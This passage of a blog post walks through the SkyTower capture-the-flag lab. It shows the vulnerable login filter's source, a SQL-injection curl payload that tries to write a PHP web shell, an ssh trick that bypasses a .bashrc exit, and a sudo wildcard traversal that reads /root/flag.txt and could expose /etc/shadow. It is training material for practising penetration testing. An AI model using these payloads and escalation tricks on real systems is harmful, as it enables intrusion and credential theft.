-<p>Reading the <code>/etc/passwd</code> revealed that there were no custom shells used for the users that were enumerated previously. O..k.. I also pulled the sources of <code>login.php</code> in order to understand what the deal with the filtering was:</p>
-
-<p><code>php SkyTower SQL Injection Filtering
-$sqlinjection = array("SELECT", "TRUE", "FALSE", "--","OR", "=", ",", "AND", "NOT");
-$email = str_ireplace($sqlinjection, "", $_POST['email']);
-$password = str_ireplace($sqlinjection, "", $_POST['password']);
-</code></p>
-
-<p>And as suspected. :)</p>
-
-<p>One last thing that I tried, really hard, was to get a web shell on the server so that I can further explore the environment. This failed miserably. The closest I was able to get was:</p>
-
-<p><code>bash SkyTower webshell fail
-$ curl --data "email=foo@bar&amp;password=' or union selecselectt * from (selecselectt 111) as a JOIN (selecselectt 222) as b JOIN (selecselectt '&lt;?php print_r(shell_exec($_GET[cmd])); ?&gt;') as c into outfile '/var/www/shell.php'#" http://192.168.137.242/login.php
-There was an error running the query [Can't create/write to file '/var/www/shell.php' (Errcode: 13)]
-</code></p>
-
-<p>This obviously alludes to the fact that the user MySQL is running as des not have access to write to the web folder. It was time to rethink what was going on here&hellip;
-Oh yes, I obviously tried to just cat <code>/root/flag.txt</code>, but didn’t expect it to be <em>that</em> easy :D</p>
-
-<h2>gaining further access</h2>
-
-<p>After spending a really long time with the SQL injections, I decided to relook the SSH section. From the SQL injection that I learnt that there don&rsquo;t <em>appear</em> to be any custom shells in use, so the other thing this could be is a <code>.bashrc</code> with a <code>exit</code> command. I know its <code>.bashrc</code> because I saw the shell is <code>/bin/bash</code> from the <code>/etc/passwd</code>. I remember that I make heavy use of <code>ssh -t</code> to execute commands on the remove server, usually to setup multiple tunnels into a network, so I thought it will come in handy here.</p>
-
-<p>For this case though, I though I&rsquo;d specify a <code>/bin/sh</code> as the <em>command</em> to run, hoping to not get caught in a <code>.bashrc</code> running:</p>
-
-<p><code>bash SkyTower .bashrc fix
-$ proxychains4 -q ssh john@127.0.0.1 -t /bin/sh
-john@127.0.0.1's password:
-$ id
-uid=1000(john) gid=1000(john) groups=1000(john)
-</code></p>
-
-<p>Woop! I was now logged in as <code>john</code>. I inspected the <code>.bashrc</code> file and saw that at the end there was:</p>
-
-<p><code>bash SkyTower .bashrc exit
-echo
-echo  "Funds have been withdrawn"
-exit
-</code></p>
-
-<p>&hellip; a exit. I simply removed the line. Now the almost obvious next step was to inspect and enumerate as much as possible. The most obvious thing that came to mind was privilege escalation as I was simply a normal user on the system at the moment.</p>
-
-<h2>enumeration enumeration enumeration</h2>
-
-<p>I enumerated, everything&hellip; Referring to a excellent <a href="http://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/">post by g0tm1lk</a> nothing aparent came up. The only semi strange thing was a empty <code>/accounts/</code> directory:</p>
-
-<p><code>bash SkyTower accounts
-john@SkyTower:/accounts$ ls -lah /accounts/
-total 8.0K
-drwxr-xr-x  2 root root 4.0K Jun 20 07:52 .
-drwxr-xr-x 24 root root 4.0K Jun 20 07:52 ..
-</code></p>
-
-<p>Other than that things seemed pretty normal. I decided to check out the other user <code>sara</code> too. This user has a similar <code>exit</code> in the <code>.bashrc</code> which I just removed. There was one distinct difference during enumeration though&hellip;</p>
-
-<p>```bash sara sudo
-sara@SkyTower:~$ sudo -l
-Matching Defaults entries for sara on this host:</p>
-
-<pre><code>env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
-</code></pre>
-
-<p>User sara may run the following commands on this host:</p>
-
-<pre><code>(root) NOPASSWD: /bin/cat /accounts/*, (root) /bin/ls /accounts/*
-</code></pre>
-
-<p>```</p>
-
-<p>This user may execute some commands as root using <code>sudo</code>. <code>sudo</code> allows you to specify what those commands are, if not all. There was one problem with this configuration though. <code>*</code> is a wildcard character, and as such, anything after <code>cat /accounts/</code> may also be run. This means that things like <code>sudo cat /accounts/../../etc/shadow</code> will work as the wildcard allows us to do a form of directory traversal.</p>
-
-<h2>pwnd</h2>
-
-<p>So, to complete SkyTower:</p>
-
-<p><code>bash SkyTower pwn
-sara@SkyTower:~$ sudo cat /accounts/../../root/flag.txt
-Congratz, have a cold one to celebrate!
-root password is theskytower
-</code></p>
-
-<p>Thanks to <a href="https://twitter.com/telspacesystems">@telspacesystems</a> for the fun experience. I learnt something so for this was totally worth it!</p>
 ]]></content>
   </entry>
   
